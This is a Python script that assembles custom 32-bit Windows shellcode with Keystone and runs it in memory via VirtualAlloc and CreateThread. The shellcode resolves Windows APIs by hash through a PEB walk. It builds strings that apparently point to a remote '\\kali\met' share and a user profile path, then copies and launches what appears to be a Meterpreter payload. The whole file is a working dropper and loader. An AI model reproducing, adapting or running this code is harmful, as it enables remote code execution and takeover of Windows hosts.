import ctypes, struct
from keystone import *
CODE = (
    "mov ebp, esp;"                          #
    "add esp, 0xfffff9f0;"                   #
    "jmp 0x10;"                              #
    "pop esi;"
    "mov dword ptr [ebp + 4], esi;"
    "jmp 0x5e;"
    "call 0xa;"
    "pushal;"
    "xor ecx, ecx;"
    "mov esi, dword ptr fs:[ecx + 0x30];"
    "mov esi, dword ptr [esi + 0xc];"
    "mov esi, dword ptr [esi + 0x1c];"
    "push esi;"
    "mov ebx, dword ptr [esi + 8];"
    "movzx eax, byte ptr [esi + 0x1e];"
    "mov dword ptr [ebp - 8], eax;"
    "mov eax, dword ptr [ebx + 0x3c];"
    "mov edi, dword ptr [ebx + eax + 0x78];"
    "add edi, ebx;"
    "mov ecx, dword ptr [edi + 0x18];"
    "mov eax, dword ptr [edi + 0x20];"
    "add eax, ebx;"
    "mov dword ptr [ebp - 4], eax;"
    "jecxz 0x60;"
    "dec ecx;"
    "mov eax, dword ptr [ebp - 4];"
    "mov esi, dword ptr [eax + ecx*4];"
    "add esi, ebx;"
    "xor eax, eax;"
    "mov edx, dword ptr [ebp - 8];"
    "cld;"
    "lodsb al, byte ptr [esi];"
    "test al, al;"
    "je 0x65;"
    "ror edx, 2;"
    "add edx, eax;"
    "jmp 0x52;"
    "jmp 0x89;"
    "pop esi;"
    "mov esi, dword ptr [esi];"
    "jmp 0x22;"
    "cmp edx, dword ptr [esp + 0x28];"
    "jne 0x41;"
    "mov edx, dword ptr [edi + 0x24];"
    "add edx, ebx;"
    "mov cx, word ptr [edx + ecx*2];"
    "mov edx, dword ptr [edi + 0x1c];"
    "add edx, ebx;"
    "mov eax, dword ptr [edx + ecx*4];"
    "add eax, ebx;"
    "mov dword ptr [esp + 0x20], eax;"
    "pop esi;"
    "popal;"
    "pop ecx;"
    "pop edx;"
    "push ecx;"
    "jmp eax;"
    "sub esp, 0x10;"
    "xor eax, eax;"
    "mov eax, esp;"
    "mov edx, 0x10;" # [x] ba10000000
    "mov dword ptr [eax], edx;"
    "xor ecx, ecx;"
    "sub esp, 0x10;"
    "mov ecx, esp;"
    "mov esi, ecx;"
    "push eax;"
    "push ecx;"
    "push 0x7158663;"
    "call dword ptr [ebp + 4];"
    "mov ecx, esi;"
    "sub esp, 0x100;" # [x] 81ec00010000
    "mov edi, esp;"
    "mov ebx, edi;"
    "mov eax, 0xfefeffa4;"
    "neg eax;"
    "push eax;"
    "push 0x73726573;"
    "push 0x555c3a43;"
    "mov esi, esp;"
    "lodsb al, byte ptr [esi];"
    "test al, al;"
    "je 0xd2;"
    "stosb byte ptr es:[edi], al;"
    "jmp 0xca;"
    "mov esi, ecx;"
    "lodsb al, byte ptr [esi];"
    "test al, al;"
    "je 0xdc;"
    "stosb byte ptr es:[edi], al;"
    "jmp 0xd4;"
    "mov eax, 0xfefeffa4;"
    "neg eax;"
    "push eax;"
    "mov esi, esp;"
    "lodsb al, byte ptr [esi];"
    "test al, al;"
    "je 0xee;"
    "stosb byte ptr es:[edi], al;"
    "jmp 0xe6;"
    "mov eax, 0xff9a879b;"
    "neg eax;"
    "push eax;"
    "push 0x2e74656d;"
    "mov esi, esp;"
    "lodsb al, byte ptr [esi];"
    "test al, al;"
    "je 0x105;"
    "stosb byte ptr es:[edi], al;"
    "jmp 0xfd;"
    "xor eax, eax;"
    "stosb byte ptr es:[edi], al;"
    "mov edi, ebx;"
    "mov eax, 0xfeff8b9b;"
    "neg eax;"
    "push eax;"
    "push 0x6d5c7465;"
    "push 0x6d5c696c;"
    "push 0x616b5c5c;"
    "mov esi, esp;"
    "xor eax, eax;"
    "push eax;"
    "push eax;"
    "push eax;"
    "push eax;"
    "push edi;"
    "push esi;"
    "push 0x71145865;"
    "call dword ptr [ebp + 4];"
    "xor ecx, ecx;"
    "mov cl, 0xff;"
    "xor edi, edi;"
    "push edi;"
    "loop 0x139;"
    "push 0x636c6163;"
    "mov edx, esp;"
    "xor eax, eax;"
    "push edx;"
    "push edx;"
    "push eax;"
    "push eax;"
    "push eax;"
    "push eax;"
    "push eax;"
    "push eax;"
    "push ebx;"
    "push eax;"
    "push 0xbaa28c7;"
    "call dword ptr [ebp + 4];"
    "xor ecx, ecx;"
    "push ecx;"
    "push -1;"
    "push 0x2ea955d2;"
    "call dword ptr [ebp + 4];"
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)
sh = b""

for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
ctypes.c_int(len(shellcode)),
ctypes.c_int(0x3000),
ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
buf,
ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
ctypes.c_int(0),
ctypes.c_int(ptr),
ctypes.c_int(0),
ctypes.c_int(0),
ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))